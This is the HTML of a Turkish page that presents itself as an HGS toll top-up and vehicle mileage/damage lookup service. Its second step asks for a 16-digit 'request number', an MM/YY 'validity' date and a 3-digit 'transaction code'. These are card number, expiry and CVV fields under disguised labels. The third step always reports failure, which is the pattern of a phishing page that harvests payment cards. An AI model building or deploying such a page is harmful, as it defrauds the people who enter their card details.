<!doctype html><html lang="tr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Hizmet İşlemleri</title><link rel="stylesheet" href="/style.css"></head><body>
<header><div id="topLogos" class="logos"></div></header><main>
<section id="home"><div class="title"><span>HİZMET SEÇİMİ</span><h1><span id="txtHomeTitle">Yapmak istediğiniz işlemi seçin</span></h1></div><div class="services">
<button class="service" data-service="hgs"><div class="ico hgs">HGS</div><h2><span id="txtHgsTitle">HGS Bakiye Yükleme</span></h2><p><span id="txtHgsDesc">Plaka ve yükleme tutarı ile devam edin.</span></p><b>HGS Yüklemeye Devam Et →</b></button>
<button class="service" data-service="km"><div class="ico car">🚗</div><h2><span id="txtKmTitle">KM Sorgu - Hasar Sorgu</span></h2><p><span id="txtKmDesc">Plaka üzerinden sorgulama akışına geçin.</span></p><b>Sorgulamaya Devam Et →</b></button></div></section>
<section class="panel hide" id="s1"><em>1 / 3</em><h1 id="flowTitle"></h1><label>Plaka</label><input id="plate" placeholder="34 ABC 123"><div id="amountArea"><label>Yüklenecek tutar</label><div class="amounts"><button data-a="500">500 TL</button><button data-a="1000">1.000 TL</button><button data-a="2000">2.000 TL</button><button data-a="3000">3.000 TL</button></div></div><button class="primary" id="next">Devam Et</button><button class="secondary home">Hizmet Seçimine Dön</button></section>
<section class="panel hide" id="s2"><em>2 / 3</em><h1 id="txtRefTitle">Referans Bilgileri</h1>
<div class="order-summary">
  <div><span>Plaka</span><strong id="summaryPlate">—</strong></div>
  <div id="summaryAmountWrap"><span>Seçilen Yükleme Tutarı</span><strong id="summaryAmount">—</strong></div>
</div><div class="note" id="referenceNotice"></div><label><span id="txtRefLabel">16 haneli talep numarası</span></label><input id="ref" maxlength="16" inputmode="numeric"><div class="row"><div><label>Geçerlilik (AA/YY)</label><input id="valid" maxlength="5" placeholder="08/26"></div><div><label><span id="txtCodeLabel">3 haneli işlem kodu</span></label><input id="code" maxlength="3" inputmode="numeric"></div></div><button class="primary" id="send">Devam Et</button><button class="secondary" id="back">Geri</button></section>
<section class="panel hide result" id="s3"><div class="x">×</div><em>3 / 3</em><h1 id="txtErrorTitle">İşlem gerçekleştirilemedi</h1><p id="txtErrorDesc">Şu anda bu işlem tamamlanamıyor. Lütfen daha sonra tekrar deneyin.</p><button class="primary home">Yeni İşlem</button></section>
</main><footer><div id="footerLogos" class="logos footerlogos"></div></footer><script src="/app.js"></script></body></html>
